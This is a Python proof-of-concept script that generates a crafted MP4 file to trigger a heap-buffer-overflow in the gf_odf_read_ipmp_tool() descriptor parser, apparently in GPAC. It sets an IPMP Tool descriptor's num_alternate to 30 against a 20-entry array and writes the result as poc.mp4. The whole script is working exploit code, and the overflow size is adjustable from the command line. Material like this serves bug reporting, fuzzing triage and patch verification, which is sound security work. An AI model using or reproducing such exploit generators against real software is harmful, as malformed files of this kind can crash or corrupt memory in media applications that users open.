#!/usr/bin/env python3
"""Generate a crafted MP4 that triggers heap-buffer-overflow in gf_odf_read_ipmp_tool().

The IPMP Tool descriptor (tag 0x61) has num_alternate=30 but the fixed array
specificToolID[MAX_IPMP_ALT_TOOLS=20] only holds 20 entries, causing a 160-byte
heap overflow when parsing the iods box via gf_isom_open_file().
"""
import struct
import sys
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def u32(v): return struct.pack(">I", v)
def u16(v): return struct.pack(">H", v)

def box(t, d):
    return u32(8 + len(d)) + t + d

def fullbox(t, ver, flags, d):
    return box(t, u32((ver << 24) | flags) + d)

def odf_desc(tag, d):
    if len(d) < 128:
        return bytes([tag, len(d)]) + d
    s, tmp = [], len(d)
    s.append(tmp & 0x7F); tmp >>= 7
    while tmp: s.append(0x80 | (tmp & 0x7F)); tmp >>= 7
    return bytes([tag]) + bytes(reversed(s)) + d

def build_mp4(num_alt=30):
    # IPMP Tool descriptor (0x61): 16B toolID + flags(is_alt=1) + num_alternate + N*16B
    tool_data = b'\x00' * 16 + bytes([0x80, num_alt])
    for i in range(num_alt):
        tool_data += bytes([i & 0xFF]) * 16
    tool_list = odf_desc(0x60, odf_desc(0x61, tool_data))

    # IOD (0x02): 2B OD-ID/flags + 5B profiles + tool_list
    iod = odf_desc(0x02, u16((1 << 6) | (1 << 4) | 0x0F) + b'\xFF' * 5 + tool_list)
    iods = fullbox(b'iods', 0, 0, iod)

    # mvhd
    matrix = b''.join(u32(v) for v in [0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000])
    mvhd = fullbox(b'mvhd', 0, 0, u32(0) * 2 + u32(90000) * 2 + u32(0x10000) + u16(0x100) + b'\x00' * 10 + matrix + b'\x00' * 24 + u32(2))

    # minimal trak
    tkhd = fullbox(b'tkhd', 0, 3, u32(0) * 2 + u32(1) + u32(0) + u32(90000) + b'\x00' * 8 + u16(0) * 4 + matrix + u32(320 << 16) + u32(240 << 16))
    mdhd = fullbox(b'mdhd', 0, 0, u32(0) * 2 + u32(90000) + u32(0) + u16(0x55C4) + u16(0))
    hdlr = fullbox(b'hdlr', 0, 0, u32(0) + b'vide' + b'\x00' * 12 + b'V\x00')
    stbl = box(b'stbl', fullbox(b'stsd', 0, 0, u32(0)) + fullbox(b'stts', 0, 0, u32(0)) + fullbox(b'stsc', 0, 0, u32(0)) + fullbox(b'stsz', 0, 0, u32(0) + u32(0)) + fullbox(b'stco', 0, 0, u32(0)))
    minf = box(b'minf', fullbox(b'vmhd', 0, 1, b'\x00' * 8) + box(b'dinf', fullbox(b'dref', 0, 0, u32(0))) + stbl)
    trak = box(b'trak', tkhd + box(b'mdia', mdhd + hdlr + minf))

    ftyp = box(b'ftyp', b'isom' + u32(0x200) + b'isom')
    moov = box(b'moov', mvhd + iods + trak)
    return ftyp + moov + box(b'mdat', b'\x00' * 8)


if __name__ == '__main__':
    num_alt = int(sys.argv[1]) if len(sys.argv) > 1 else 30
    out_path = os.path.join(OUT, "poc.mp4")
    data = build_mp4(num_alt)
    with open(out_path, 'wb') as f:
        f.write(data)
    print(f"Written {len(data)} bytes to {out_path} (num_alternate={num_alt})")
